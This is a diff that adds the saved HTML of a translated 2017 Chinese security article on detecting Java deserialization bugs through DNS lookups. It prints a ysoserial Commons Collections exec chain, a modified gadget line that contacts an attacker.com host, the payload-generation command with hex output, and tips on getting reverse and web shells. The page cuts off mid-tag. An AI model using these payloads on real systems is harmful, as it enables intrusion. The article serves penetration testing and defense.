@@ -1,0 +1,582 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】通过泄露到DNS的信息检测反序列化漏洞（含演示视频） - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="反序列化漏洞,java反序列化漏洞"/>
+    
+        <meta name="description" content="JAVA反序列化漏洞正在被越来越多的厂商和攻击者所熟知，在传统的检查工具中，大多数可用的小工具依赖于命令执行API。但由于目标操作系统环境限制条件存在区别，部分payload在执行时不会成功。就此问题，本文主要向大家介绍如何实现一个通用的payload，简化大规模反序列化漏洞的探测过程。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】通过泄露到DNS的信息检测反序列化漏洞（含演示视频）</h2>
+                <div class="article-msg">
+                    <span class="time">2017-03-27 14:41:39</span>
+                    
+                                        <span class="read">阅读：11881次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_3662"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="3662" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href="http://gosecure.net/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/"
+                             target="_blank">来源： 安全客</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2798962642" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2798962642" style="color:#848e99;">pwn_361</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 0em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p9.qhimg.com/t0169262402e6ea2566.jpg" title="t01b4aa3942271d6d66.jpg" alt="http://p3.qhimg.com/t01b4aa3942271d6d66.jpg"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">翻译：</span><a href="http://bobao.360.cn/member/contribute?uid=2798962642" target="_blank" textvalue="pwn_361" style="text-decoration: none;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px; color: rgb(0, 112, 192); font-weight: 900;">pwn_361</span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">稿费：200RMB</span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">前言</span></strong></span><br/></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">此刻，JAVA反序列化漏洞正在被厂商和攻击者所熟知。渗透测试人员今后还会遇到这种类型的漏洞。使用当前的一些小工具可以识别出这些漏洞，不过，大多数可用的小工具依赖于命令执行API。由于目标操作系统环境限制条件存在区别，因此，有效载荷的命令在目标系统中执行时，不一定会每次都成功。另外，在目标系统中，载荷所使用的命令也有可能不存在，或者载荷所要求的参数可能因命令的版本或安装的环境而有所不同(以GUN的netcat VS OpenBSD的netcat为例)。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">由于在部分目标系统环境中存在上面提到的关于执行命令的一些限制，要想探测出这些漏洞就需要更多的试验和错误，对于目标，可能需要发送多个有效载荷，这使得自动化探测更加困难。制作一个通用的有效载荷，将会简化大规模反序列化漏洞的探测过程。在介绍我们的扫描方法之前，让我们为“更可靠的有效载荷”定义一个具体的实现目标。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">目标</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">1.使有效载荷和具体的操作系统无关，如Windows、Ubuntu、Alpine Linux (Docker)、Solaris、AIX等系统。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2.即使目标的WEB容器运行在安全管理器或沙盒中，也能探测到发生的事情。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3.支持最常见的JVM1.6+版本，和可能的1.5*版本。</span></p><p style="text-indent: 2em; text-align: left;"><a href="https://github.com/frohoff/ysoserial" target="_self"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">YSoSerial</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">生成的大多数载荷都符合这些条件。</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t019ec7ebb28033c491.png" title="t01150a43aa8d1ee3c6.png" alt="http://p4.qhimg.com/t01150a43aa8d1ee3c6.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">示例场景</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">GoSecure的渗透测试小组遇到过几个需要对当前的小工具(或者称为载荷、组件)做一些修改的案例。例如，发现了一个旧的JBoss实例，并且对外开放了JMXInvokerServlet接口。根据它的版本，我们预计它应该存在可利用的漏洞。但是令人惊讶的是，我们利用所有已知的漏洞测试工具对这个JBoss实例进行测试，但是都失败了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这些测试工具的失败意味着存在两种可能性：一是这些小工具在这个特定的环境中不起作用，二是目标系统已经打了补丁。然而，我们利用一个简单的有效载荷(就是后面我们创建的DNS解析载荷)做了一个DNS查询，证实了目标系统确实存在相应漏洞。基于这个事实，我们认为，为了避免使用命令执行API，创建一个替代的小工具是有必要的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">创建一个DNS小工具</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">为了确认目标是否存在漏洞，我们将对YSoSerial(frohoff/ysoserial、未修改)的一个已经存在的小工具进行修改。我们将使用一个简单的代码代替命令执行载荷，该代码将触发一个DNS解析。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Ysoserial中最常用的一个有效载荷是“Commons Collection”。其中，“Transformer”链会触发下面的代码：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Transformer链(使用了命令执行载荷)：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">final&nbsp;Transformer[]&nbsp;transformers&nbsp;=&nbsp;new&nbsp;Transformer[]&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;new&nbsp;ConstantTransformer(Runtime.class),
+&nbsp;&nbsp;&nbsp;&nbsp;new&nbsp;InvokerTransformer(&quot;getMethod&quot;,&nbsp;new&nbsp;Class[]&nbsp;{String.class,&nbsp;Class[].class&nbsp;},&nbsp;new&nbsp;Object[]&nbsp;{&quot;getRuntime&quot;,&nbsp;new&nbsp;Class[0]&nbsp;}),
+&nbsp;&nbsp;&nbsp;&nbsp;new&nbsp;InvokerTransformer(&quot;invoke&quot;,&nbsp;new&nbsp;Class[]&nbsp;{Object.class,&nbsp;Object[].class&nbsp;},&nbsp;new&nbsp;Object[]&nbsp;{null,&nbsp;new&nbsp;Object[0]&nbsp;}),
+&nbsp;&nbsp;&nbsp;&nbsp;new&nbsp;InvokerTransformer(&quot;exec&quot;,&nbsp;new&nbsp;Class[]&nbsp;{&nbsp;String.class&nbsp;},&nbsp;execArgs),
+&nbsp;&nbsp;&nbsp;&nbsp;new&nbsp;ConstantTransformer(1)&nbsp;};</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">触发的代码：</span></p><pre class="brush:plain;toolbar:false">((Runtime)&nbsp;Runtime.class.getMethod(&quot;getRuntime&quot;,&nbsp;new&nbsp;Class[0]).invoke(new&nbsp;Class[]{&nbsp;Object.class,&nbsp;Object.class},new&nbsp;Object[0])).exec(&quot;echo&nbsp;your&nbsp;command&nbsp;here&quot;);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">上面是未经修改的Ysoserial的代码，为了不使用命令执行API，我们对它进行必要的修改。同时，我们不能使用“nslookup”命令来触发DNS解析，因为我们要避免使用命令执行API。为此，我们将直接使用java API。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">下面是我们修改过的Transformer链(使用了DNS解析载荷)：</span></p><pre class="brush:plain;toolbar:false">new&nbsp;URL(&quot;http://resolve-me-aaaa.attacker.com&quot;).openConnection().getInputStream().read();</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">确认目标是否存在漏洞</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如下图，我们利用Ysoserial(修改过的)生成了一个能解析独特主机名的一个载荷(或者称为配件、小工具)。将载荷发送给目标服务器后，如果服务器处理了任何反序列化，这个独特名称就可以作为追踪的方法。服务器可能会多次评估这个漏洞，或带有一些延时。使用独特主机名可以避免有可能产生的混淆，特别是当扫描多个主机时。在</span><a href="https://github.com/GoSecure/ysoserial" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们的ysoserial分支</a><span style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">(GoSecure/ysoserial、已修改)中，已经有可用的完整POC代码。如下图，生成载荷：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;java&nbsp;-jar&nbsp;ysoserial-0.0.5-SNAPSHOT-all.jar&nbsp;CommonsCollections1Dns&nbsp;http://resolve-me-aaaa.attacker.com&nbsp;|&nbsp;xxd
+00000000:&nbsp;aced&nbsp;0005&nbsp;7372&nbsp;0032&nbsp;7375&nbsp;6e2e&nbsp;7265&nbsp;666c&nbsp;....sr.2sun.refl
+00000010:&nbsp;6563&nbsp;742e&nbsp;616e&nbsp;6e6f&nbsp;7461&nbsp;7469&nbsp;6f6e&nbsp;2e41&nbsp;ect.annotation.A
+00000020:&nbsp;6e6e&nbsp;6f74&nbsp;6174&nbsp;696f&nbsp;6e49&nbsp;6e76&nbsp;6f63&nbsp;6174&nbsp;nnotationInvocat
+00000030:&nbsp;696f&nbsp;6e48&nbsp;616e&nbsp;646c&nbsp;6572&nbsp;55ca&nbsp;f50f&nbsp;15cb&nbsp;ionHandlerU.....
+00000040:&nbsp;7ea5&nbsp;0200&nbsp;024c&nbsp;000c&nbsp;6d65&nbsp;6d62&nbsp;6572&nbsp;5661&nbsp;~....L..memberVa
+00000050:&nbsp;6c75&nbsp;6573&nbsp;7400&nbsp;0f4c&nbsp;6a61&nbsp;7661&nbsp;2f75&nbsp;7469&nbsp;luest..Ljava/uti
+00000060:&nbsp;6c2f&nbsp;4d61&nbsp;703b&nbsp;4c00&nbsp;0474&nbsp;7970&nbsp;6574&nbsp;0011&nbsp;l/Map;L..typet..
+00000070:&nbsp;4c6a&nbsp;6176&nbsp;612f&nbsp;6c61&nbsp;6e67&nbsp;2f43&nbsp;6c61&nbsp;7373&nbsp;Ljava/lang/Class
+00000080:&nbsp;3b78&nbsp;7073&nbsp;7d00&nbsp;0000&nbsp;0100&nbsp;0d6a&nbsp;6176&nbsp;612e&nbsp;;xps}......java.
+00000090:&nbsp;7574&nbsp;696c&nbsp;2e4d&nbsp;6170&nbsp;7872&nbsp;0017&nbsp;6a61&nbsp;7661&nbsp;util.Mapxr..java
+000000a0:&nbsp;2e6c&nbsp;616e&nbsp;672e&nbsp;7265&nbsp;666c&nbsp;6563&nbsp;742e&nbsp;5072&nbsp;.lang.reflect.Pr
+000000b0:&nbsp;6f78&nbsp;79e1&nbsp;27da&nbsp;20cc&nbsp;1043&nbsp;cb02&nbsp;0001&nbsp;4c00&nbsp;oxy.&#39;.&nbsp;..C....L.
+000000c0:&nbsp;0168&nbsp;7400&nbsp;254c&nbsp;6a61&nbsp;7661&nbsp;2f6c&nbsp;616e&nbsp;672f&nbsp;.ht.%Ljava/lang/
+000000d0:&nbsp;7265&nbsp;666c&nbsp;6563&nbsp;742f&nbsp;496e&nbsp;766f&nbsp;6361&nbsp;7469&nbsp;reflect/Invocati
+000000e0:&nbsp;6f6e&nbsp;4861&nbsp;6e64&nbsp;6c65&nbsp;723b&nbsp;7870&nbsp;7371&nbsp;007e&nbsp;onHandler;xpsq.~
+[...]</pre><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">向目标系统发送载荷后，如果在我们配置的DNS服务器上收到了一个相应的DNS查询请求，那么就可以确认目标存在漏洞。为了记录DNS查询请求，我们可以利用很多工具，如 </span><a href="http://thesprawl.org/projects/dnschef/" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">DNS chef</a><span style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">，</span><a href="https://portswigger.net/burp/help/collaborator.html" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Burp Collaborator</a><span style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">或</span><a href="https://jontai.me/blog/2011/11/monitoring-dns-queries-with-tcpdump/" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">tcpdump</a><span style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">。在下面的样本中，我们使用DNS Chef来记录查询请求，可以看到DNS查询请求成功到达测试服务器。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">#&nbsp;python&nbsp;dnschef.py&nbsp;-q&nbsp;--fakeip&nbsp;127.0.0.1&nbsp;-i&nbsp;0.0.0.0
+[*]&nbsp;DNSChef&nbsp;started&nbsp;on&nbsp;interface:&nbsp;0.0.0.0
+[*]&nbsp;Using&nbsp;the&nbsp;following&nbsp;nameservers:&nbsp;8.8.8.8
+[*]&nbsp;Cooking&nbsp;all&nbsp;A&nbsp;replies&nbsp;to&nbsp;point&nbsp;to&nbsp;127.0.0.1
+[12:16:05]&nbsp;74.125.X.X:&nbsp;cooking&nbsp;the&nbsp;response&nbsp;of&nbsp;type&nbsp;&#39;A&#39;&nbsp;for&nbsp;resolve-me-aaaa.attacker.com&nbsp;to&nbsp;127.0.0.1
+[12:16:05]&nbsp;192.221.X.X:&nbsp;cooking&nbsp;the&nbsp;response&nbsp;of&nbsp;type&nbsp;&#39;A&#39;&nbsp;for&nbsp;resolve-me-aaaa.attacker.com&nbsp;to&nbsp;127.0.0.1</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">下图是这种异步扫描方法的直观表示图：</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01239020b3b7a03854.png" title="t01aa47cf827a57f122.png" alt="http://p0.qhimg.com/t01aa47cf827a57f122.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">其他考虑</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">一旦确认目标存在漏洞，渗透测试人员为了得到一个SHELL，需要继续做一些试验、或触发一些错误命令。关于这个工作，有一些有用的技巧：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1.确保你已经测试了一些反向SHELL命令(查看</span><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_self" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Reverse Shell Cheat-Sheet</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">)。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2.“Common collection”载荷在某些特定的JVM中可能会失败(如IBM J9)。Mathias Kaiser制作了一个特殊的载荷，支持这个不常见的JVM，</span><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java" target="_self" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">详情请看CommonsCollections6</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3.如果目标强制执行了一个安全管理器，你可能需要制作一个自定义的小工具。你可以通过“</span><a href="https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html" target="_self" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">DEADCODE’s blog article</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">”去了解transformer链的大致情况。一种流行的方法是找到Web根目录的路径，并编写一个可以稍后执行的web shell。关于此，</span><a href="https://github.com/GoSecure/ysoserial/tree/master/src/main/java/ysoserial/payloads" target="_self" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在GoSecure仓库</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">中有一些样本工具。再说一次，如果目标环境中的安全管理器会阻止命令执行，才会需要这些工具。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft 